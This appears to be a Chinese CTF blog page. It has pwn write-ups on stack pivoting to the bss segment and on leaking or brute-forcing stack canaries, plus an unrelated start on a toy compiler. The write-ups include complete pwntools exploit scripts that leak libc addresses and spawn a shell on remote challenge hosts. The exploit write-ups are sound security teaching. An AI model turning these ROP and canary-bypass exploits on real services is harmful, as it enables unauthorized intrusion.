class="number">0x27</span></span><br><span class="line">sl(pld)</span><br><span class="line">ebp = uu32(ru(<span class="string">"\xff"</span>,drop=<span class="literal">False</span>)[<span class="number">-4</span>:])</span><br><span class="line">leak(<span class="string">"ebp"</span>,ebp)</span><br><span class="line">esp = ebp - <span class="number">0x48</span></span><br><span class="line">pld = (<span class="string">b"A"</span>*<span class="number">0x4</span> + p32(sys) + p32(main) + p32(esp+<span class="number">0x20</span>) + <span class="string">"/bin/sh\x00"</span> ).ljust(<span class="number">0x28</span>,<span class="string">'A'</span>) + p32(esp+<span class="number">0x10</span>) + p32(leave_ret)</span><br><span class="line">s(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h2 id="劫持到bss段"><a href="#劫持到bss段" class="headerlink" title="劫持到bss段"></a>劫持到bss段</h2><h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302221412110.png" alt="image-20210302221412110"></p>
<blockquote>
<p>bss段上可以写，直接迁移到bss段上，然后继续write泄露，getshell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29456</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.2")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.231.so"</span>)</span><br><span class="line">bss = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">puts = elf.sym[<span class="string">"puts"</span>]</span><br><span class="line">write_plt = elf.sym[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc_base = write - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">sh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(sys) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/">写一个编译器</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-02-20
        </span><span class="post-visits"
             data-url="/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/"
             data-title="写一个编译器">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><p>d当有了这个文件夹，我才有动力把它更完。</p>
<h1 id="0x01-设计"><a href="#0x01-设计" class="headerlink" title="0x01 设计"></a>0x01 设计</h1><h2 id="1-构建流程"><a href="#1-构建流程" class="headerlink" title="1. 构建流程"></a>1. 构建流程</h2><p>有三个步骤</p>
<ol>
<li>词法分析器，用于将字符串转化成内部的表示结构。</li>
<li>语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li>
<li>目标代码的生成，将语法树转化成目标代码。</li>
</ol>
<p>这里我们的步骤</p>
<ol>
<li>构建我们自己的虚拟机以及指令集。这后生成的目标代码便是我们的指令集。</li>
<li>构建我们的词法分析器</li>
<li>构建语法分析器</li>
</ol>
<h2 id="2-编译器框架"><a href="#2-编译器框架" class="headerlink" title="2. 编译器框架"></a>2. 编译器框架</h2><p>这里有一个单独用于解析“表达式”的函数 <code>expression</code> 是因为表达式在语法分析中相对独立并且比较复杂，所以我们将它单独作为一个模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> token;            <span class="comment">// current token</span></span><br><span class="line"><span class="keyword">char</span> *src, *old_src;  <span class="comment">// pointer to source code string;</span></span><br><span class="line"><span class="keyword">int</span> poolsize;         <span class="comment">// default size of text/data/stack</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">line</span>;             <span class="comment">// line number</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    token = *src++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expression</span><span class="params">(<span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">program</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    next();                  <span class="comment">// get next token</span></span><br><span class="line">    <span class="keyword">while</span> (token &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"token is: %c\n"</span>, token);</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">eval</span><span class="params">()</span> </span>&#123; <span class="comment">// do nothing yet</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, fd;</span><br><span class="line"></span><br><span class="line">    argc--;</span><br><span class="line">    argv++;</span><br><span class="line"></span><br><span class="line">    poolsize = <span class="number">256</span> * <span class="number">1024</span>; <span class="comment">// arbitrary size</span></span><br><span class="line">    <span class="built_in">line</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(*argv, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not open(%s)\n"</span>, *argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(src = old_src = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for source area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the source file</span></span><br><span class="line">    <span class="keyword">if</span> ((i = <span class="built_in">read</span>(fd, src, poolsize<span class="number">-1</span>)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"read() returned %d\n"</span>, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = <span class="number">0</span>; <span class="comment">// add EOF character</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    program();</span><br><span class="line">    <span class="keyword">return</span> eval();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li>
<li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li>
<li><code>expression(level)</code> 用于解析一个表达式。</li>
<li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li>
</ol>
</blockquote>
<p>上面代码主要是逐字读取，并输出，接下来我们具体实现每个函数功能。</p>
<h1 id="0x02-虚拟机"><a href="#0x02-虚拟机" class="headerlink" title="0x02 虚拟机"></a>0x02 虚拟机</h1><p>在计算机中，我们主要关心，内存，CPU，寄存器。</p>
<p>代码（汇编指令）以二进制的形式保存在内存中；CPU 从中一条条地加载指令执行；程序运行的状态保存在寄存器中。</p>
<h2 id="1-内存"><a href="#1-内存" class="headerlink" title="1. 内存"></a>1. 内存</h2><p>内存用于存储数据，这里的数据可以是代码，也可以是其它的数据。</p>
<p>32 位的机器中，我们可以使用的内存地址为 <code>2^32 = 4G</code></p>
<p>内存中有几个段，在前面程序员自我修养中已经讲过了</p>
<ol>
<li>代码段（text）用于存放代码（指令）。</li>
<li>数据段（data）用于存放初始化了的数据，如<code>int i = 10;</code>，就需要存放到数据段中。</li>
<li>未初始化数据段（bss）用于存放未初始化的数据，如 <code>int i[1000];</code>，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。</li>
<li>栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。</li>
<li>堆（heap）用于为程序动态分配内存。</li>
</ol>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">Linux安全机制</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-02-19
        </span><span class="post-visits"
             data-url="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"
             data-title="Linux安全机制">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="0x01-Canary"><a href="#0x01-Canary" class="headerlink" title="0x01 Canary"></a>0x01 Canary</h1><p>Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做cookies。Cannry是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出时从低地址到高地址，因此想要攻击成功必须覆盖cannry。</p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Cannries分为三类，分别是<code>terminator</code> <code>random</code> <code>random XOR</code></p>
<ul>
<li><code>Terminator canaries</code>：由于许多栈溢出都是由于字符串操作不当造成的，也就是最后会以<code>\x00</code>结尾，其实是被截断。所以<code>Terminator canaries</code>将地位设置为<code>\x00</code>。此外还有截断字符CR(0x0d)、LF(0x0a)、EOF(0xff)</li>
<li><code>Random canaries</code>：这个通常在程序初始化时随机生成出来，由<code>/dev/urandom</code>生成</li>
<li><code>Random XOR canaries</code>：与上一个相同，但多了异或操作，相比上一个更难操作。</li>
</ul>
<p>gcc参数开启canary</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
<h2 id="2-演示"><a href="#2-演示" class="headerlink" title="2. 演示"></a>2. 演示</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	char buf[10];</span><br><span class="line">	scanf(&quot;%s&quot;,buf);		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gcc -fstack-protector b.c -o b</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150601689.png" alt="image-20210220150601689"></p>
<p>出现错误</p>
<p>看汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150909813.png" alt="image-20210220150909813"></p>
<blockquote>
<p>看两处红框地方，我们可以知道是把一些东西放到rax中，之后又把rax中异或跳转。</p>
<p>1.fs寄存器是什么？</p>
<p>fs寄存器被用于存放线程局部存储(Thread Local Stroage,TLS)。TLS是为了避免多个线程同时访问同一全局变量或静态变量所导致的冲突。TLS为每一个使用全局变量的线程提供一个变量值的副本。从全局变量角度看，就是全局变量被克隆了多个副本，每一个副本都可以被一个线程独立改变。而0x28就是stack_guard</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;typedef struct</span><br><span class="line">&gt;&#123;</span><br><span class="line"> void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                      thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line"> dtv_t *dtv;</span><br><span class="line"> void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line"> int multiple_threads;</span><br><span class="line"> uintptr_t sysinfo;</span><br><span class="line"> uintptr_t stack_guard;</span><br><span class="line"> ...</span><br><span class="line">&gt;&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.png" alt="img"></p>
<h2 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3. 攻击"></a>3. 攻击</h2><p>攻击有两种思路</p>
<ol>
<li>第一种就是泄露canary，然后覆盖</li>
<li>第二种是同时篡改TLS和栈上的Canary从而绕过检查</li>
</ol>
<p>只能一次操作的通常是劫持got表，多次操作的泄露canary</p>
<h2 id="3-1-泄露栈中的-Canary"><a href="#3-1-泄露栈中的-Canary" class="headerlink" title="3.1 泄露栈中的 Canary"></a>3.1 泄露栈中的 Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>
<h3 id="1-（攻防世界）厦门邀请赛pwn1"><a href="#1-（攻防世界）厦门邀请赛pwn1" class="headerlink" title="1.（攻防世界）厦门邀请赛pwn1"></a>1.（攻防世界）厦门邀请赛pwn1</h3><p>说一下这个题的思路把</p>
<ol>
<li>利用read泄露canary</li>
<li>64位puts泄露基址</li>
<li>one_gagdet直接shell</li>
</ol>
<p>说一下我的难点</p>
<blockquote>
<p>1.第一次做这个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(7).rjust(8,&#39;\x00&#39;)) </span><br></pre></td></tr></table></figure>
<p>要明白是右对齐，也可以这样写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(8))-0xa</span><br></pre></td></tr></table></figure>
<p>具体就是上面讲的原理</p>
<p>2.sl()和s()区别</p>
<p>sl()会多发一个’\n’</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#ontext.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.232.so"</span>)</span><br><span class="line">p = remote(<span class="string">"111.200.241.244"</span>,<span class="number">41155</span>)</span><br><span class="line"><span class="comment">#p = process("./babystack")</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x400908</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> </span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4009DD')</span></span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">b'A'</span>*<span class="number">0x88</span>+<span class="string">'\n'</span>)</span><br><span class="line">canary = u64(r(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))  </span><br><span class="line">leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">puts = uu64(r(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">leak(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">leak(<span class="string">'libc'</span>,libc_base)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(one_gadget)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h2 id="3-2Fork子进程程序爆破canary"><a href="#3-2Fork子进程程序爆破canary" class="headerlink" title="3.2Fork子进程程序爆破canary"></a>3.2Fork子进程程序爆破canary</h2><h3 id="NJCTF2017（messager）"><a href="#NJCTF2017（messager）" class="headerlink" title="NJCTF2017（messager）"></a>NJCTF2017（messager）</h3><p>看一下这个题</p>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155807161.png" alt="image-20210221155807161"></p>
<p>函数主要逻辑是将flag从文件里取出，然后放到bss段，同时开通了一个socket发送flag函数send，目的就是控制这个函数</p>
<p>此外，这个主进程每次还会fork一个子进程，让用户与400BE9进行交互</p>
<p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155843764.png" alt="image-20210221155843764"></p>
<p>sub_400BE9函数里有栈溢出</p>
<blockquote>
<p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致</p>
<p>通常情况下，我们爆破canary是不可能的，但由于同一个进程内复刻的子进程，它们的canaries是不变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会</p>
<p>爆破是逐字节进行的，根据进程崩溃与否来判断填上去的字符串是否正确。</p>
</blockquote>
